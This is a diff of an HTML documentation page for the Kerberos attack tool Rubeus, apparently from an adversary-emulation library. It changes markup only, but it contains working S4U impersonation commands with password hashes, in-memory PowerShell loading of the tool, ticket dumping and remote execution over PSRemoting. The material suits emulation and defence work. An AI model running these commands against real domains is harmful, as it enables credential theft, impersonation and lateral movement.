+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe s4u /user:patsy /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /msdsspn:ldap/PRIMARY.testlab.local /impersonateuser:harmj0y /ptt
 
  ______        _
 (_____ \      | |
@@ -2943,7 +2944,7 @@ v1.4.2
 </doc-codeblock></div>
 <p>Executing S4U2self to a machine using its machine account hash, substituting in the service names we want to abuse after:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe s4u /user:primary$ /rc4:46b910dbe4514bd144b44cb554c256db /impersonateuser:harmj0y
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe s4u /user:primary$ /rc4:46b910dbe4514bd144b44cb554c256db /impersonateuser:harmj0y
 
  ______        _
 (_____ \      | |
@@ -3086,7 +3087,7 @@ Directory of \\primary.testlab.local\C$
 </doc-anchor-target>
 <p>The <strong>currentluid</strong> action will display the current user&#x27;s logon ID (LUID).</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe currentluid
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe currentluid
 
  ______        _
 (_____ \      | |
@@ -3109,7 +3110,7 @@ v1.5.0
     </h2>
 </doc-anchor-target>
 <p>We are not planning on releasing binaries for Rubeus, so you will have to compile yourself :)</p>
-<p>Rubeus has been built against .NET 3.5 and is compatible with <a href="https://visualstudio.microsoft.com/vs/community/" class="outbound" target="_blank"><span>Visual Studio 2019 Community Edition</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>. Simply open up the project .sln, choose &quot;Release&quot;, and build.</p>
+<p>Rubeus has been built against .NET 3.5 and is compatible with <a href="https://visualstudio.microsoft.com/vs/community/" class="outbound" target="_blank"><span>Visual Studio 2019 Community Edition</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>. Simply open up the project .sln, choose &quot;Release&quot;, and build.</p>
 <doc-anchor-target id="targeting-other-net-versions">
     <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#targeting-other-net-versions">#</doc-anchor-trigger>
@@ -3125,13 +3126,13 @@ v1.5.0
 </doc-anchor-target>
 <p>To build Rubeus as a library, under <strong>Project</strong> -&gt; <strong>Rubeus Properties</strong> -&gt; change <strong>Output type</strong> to <strong>Class Library</strong>. Compile, and add the Rubeus.dll as a reference to whatever project you want. Rubeus functionality can then be invoked as in a number of ways:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">// pass the Main method the arguments you want
+<pre translate="no" class="language-none"><code v-pre class="language-none">// pass the Main method the arguments you want
 Rubeus.Program.Main(&quot;dump /luid:3050142&quot;.Split());
 
 // or invoke specific functionality manually
 Rubeus.LSA.ListKerberosTicketDataAllUsers(new Rubeus.Interop.LUID());</code></pre>
 </doc-codeblock></div>
-<p>You can then use <a href="https://www.microsoft.com/en-us/download/details.aspx?displaylang=en&amp;id=17630" class="outbound" target="_blank"><span>ILMerge</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> to merge the Rubeus.dll into your resulting project assembly for a single, self-contained file.</p>
+<p>You can then use <a href="https://www.microsoft.com/en-us/download/details.aspx?displaylang=en&amp;id=17630" class="outbound" target="_blank"><span>ILMerge</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> to merge the Rubeus.dll into your resulting project assembly for a single, self-contained file.</p>
 <doc-anchor-target id="sidenote-running-rubeus-through-powershell">
     <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#sidenote-running-rubeus-through-powershell">#</doc-anchor-trigger>
@@ -3140,19 +3141,19 @@ Rubeus.LSA.ListKerberosTicketDataAllUsers(new Rubeus.Interop.LUID());</code></pr
 </doc-anchor-target>
 <p>If you want to run Rubeus in-memory through a PowerShell wrapper, first compile the Rubeus and base64-encode the resulting assembly:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">[Convert]::ToBase64String([IO.File]::ReadAllBytes(&quot;C:\Temp\Rubeus.exe&quot;)) | Out-File -Encoding ASCII C:\Temp\rubeus.txt</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">[Convert]::ToBase64String([IO.File]::ReadAllBytes(&quot;C:\Temp\Rubeus.exe&quot;)) | Out-File -Encoding ASCII C:\Temp\rubeus.txt</code></pre>
 </doc-codeblock></div>
 <p>Rubeus can then be loaded in a PowerShell script with the following (where &quot;aa...&quot; is replaced with the base64-encoded Rubeus assembly string):</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String(&quot;aa...&quot;))</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String(&quot;aa...&quot;))</code></pre>
 </doc-codeblock></div>
 <p>The Main() method and any arguments can then be invoked as follows:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">[Rubeus.Program]::Main(&quot;dump /user:administrator&quot;.Split())</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">[Rubeus.Program]::Main(&quot;dump /user:administrator&quot;.Split())</code></pre>
 </doc-codeblock></div>
 <p>Or individual functions can be invoked:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">$TicketBytes = [convert]::FromBase64String('BASE64_KERB_TICKET')
+<pre translate="no" class="language-none"><code v-pre class="language-none">$TicketBytes = [convert]::FromBase64String('BASE64_KERB_TICKET')
 # start mmc.exe as netonly, not-hidden
 $LogonID = [Rubeus.Helpers]::CreateProcessNetOnly(&quot;mmc.exe&quot;, $true)
 # apply the ticket to mmc's logon session
@@ -3167,11 +3168,11 @@ $LogonID = [Rubeus.Helpers]::CreateProcessNetOnly(&quot;mmc.exe&quot;, $true)
 <p>Due to the way PSRemoting handles output, we need to redirect stdout to a string and return that instead. Luckily, Rubeus has a function to help with that.</p>
 <p>If you follow the instructions in <doc-anchor-trigger to="#sidenote-running-rubeus-through-powershell">Sidenote: Running Rubeus Through PowerShell</doc-anchor-trigger> to create a Rubeus.ps1, append something like the following to the script:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">[Rubeus.Program]::MainString(&quot;triage&quot;)</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">[Rubeus.Program]::MainString(&quot;triage&quot;)</code></pre>
 </doc-codeblock></div>
 <p>You should then be able to run Rubeus over PSRemoting with something like the following:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">$s = New-PSSession dc.theshire.local
+<pre translate="no" class="language-none"><code v-pre class="language-none">$s = New-PSSession dc.theshire.local
 Invoke-Command -Session $s -FilePath C:\Temp\Rubeus.ps1</code></pre>
 </doc-codeblock></div>
 <p>Alternatively, Rubeus&#x27; <code v-pre>/consoleoutfile:C:\FILE.txt</code> argument will redirect all output streams to the specified file.</p>
@@ -3180,23 +3181,23 @@ Invoke-Command -Session $s -FilePath C:\Temp\Rubeus.ps1</code></pre>
                                 <!-- Required only on API pages -->
                                 <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                             </div>
-                            <footer class="clear-both">
+                            <footer id="retype-content-footer" class="clear-both">
                             
-                                <nav class="flex mt-14">
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../../enterprise/wizard_spider/resources/rubeus/changelog/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../../enterprise/wizard_spider/resources/rubeus/changelog/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
-                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
                                                 <span class="block mt-1">Changelog</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../../enterprise/wizard_spider/resources/trickbot/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../../enterprise/wizard_spider/resources/trickbot/">
                                             <span>
-                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
                                                 <span class="block mt-1">Trick​Bot</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
@@ -3206,15 +3207,15 @@ Invoke-Command -Session $s -FilePath C:\Temp\Rubeus.ps1</code></pre>
                             </footer>
                         </main>
                 
-                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
-                            <footer class="flex flex-wrap items-center justify-between">
-                                <div>
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div id="retype-footer-links" class="print:hidden">
                                     <ul class="flex flex-wrap items-center text-sm">
                                         <li>
-                                            <a class="inline-flex items-center mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200 md:mb-0" href="https://github.com/attackevals/ael">
+                                            <a class="inline-flex items-center mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-footer-link hover:text-footer-link-hover md:mb-0" href="https://github.com/attackevals/ael">
                                                 <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                     <g fill="currentColor">
-                                                        <path d="M12 1C5.9225 1 1 5.9225 1 12C1 16.8675 4.14875 20.9787 8.52125 22.4362C9.07125 22.5325 9.2775 22.2025 9.2775 21.9137C9.2775 21.6525 9.26375 20.7862 9.26375 19.865C6.5 20.3737 5.785 19.1912 5.565 18.5725C5.44125 18.2562 4.905 17.28 4.4375 17.0187C4.0525 16.8125 3.5025 16.3037 4.42375 16.29C5.29 16.2762 5.90875 17.0875 6.115 17.4175C7.105 19.0812 8.68625 18.6137 9.31875 18.325C9.415 17.61 9.70375 17.1287 10.02 16.8537C7.5725 16.5787 5.015 15.63 5.015 11.4225C5.015 10.2262 5.44125 9.23625 6.1425 8.46625C6.0325 8.19125 5.6475 7.06375 6.2525 5.55125C6.2525 5.55125 7.17375 5.2625 9.2775 6.67875C10.1575 6.43125 11.0925 6.3075 12.0275 6.3075C12.9625 6.3075 13.8975 6.43125 14.7775 6.67875C16.8813 5.24875 17.8025 5.55125 17.8025 5.55125C18.4075 7.06375 18.0225 8.19125 17.9125 8.46625C18.6138 9.23625 19.04 10.2125 19.04 11.4225C19.04 15.6437 16.4688 16.5787 14.0213 16.8537C14.42 17.1975 14.7638 17.8575 14.7638 18.8887C14.7638 20.36 14.75 21.5425 14.75 21.9137C14.75 22.2025 14.9563 22.5462 15.5063 22.4362C19.8513 20.9787 23 16.8537 23 12C23 5.9225 18.0775 1 12 1Z"/>
+                                                        <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                                     </g>
                                                 </svg>
                                                 <span>ATTACK Evaluations Library GitHub</span>
@@ -3222,18 +3223,18 @@ Invoke-Command -Session $s -FilePath C:\Temp\Rubeus.ps1</code></pre>
                                         </li>
                                     </ul>
                                 </div>
-                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
                             </footer>
                         </div>
                     </div>
                 
                     <!-- Rendered if sidebar right is enabled -->
                     <!-- Sidebar right skeleton-->
-                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
                         <div class="pl-5">
-                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                         </div>
                     </div>
                 
@@ -3249,7 +3250,7 @@ Invoke-Command -Session $s -FilePath C:\Temp\Rubeus.ps1</code></pre>
     </div>
 
 
-    <div id="docs-overlay-target"></div>
+    <div id="retype-overlay-target"></div>
 
     <script data-cfasync="false">window.__DOCS__ = { "title": "Rubeus", level: 5, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
